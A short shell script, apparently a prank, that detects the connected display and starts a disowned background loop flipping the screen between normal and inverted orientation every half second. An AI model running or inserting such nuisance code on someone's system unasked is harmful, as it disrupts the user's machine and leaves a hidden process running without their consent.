DP=$(xrandr | grep " connected" | cut -d' ' -f1);

while true; do
	xrandr --output $DP --rotate normal;
	sleep 0.5; 
	xrandr --output $DP --rotate inverted;
	sleep 0.5; 
done &
disown
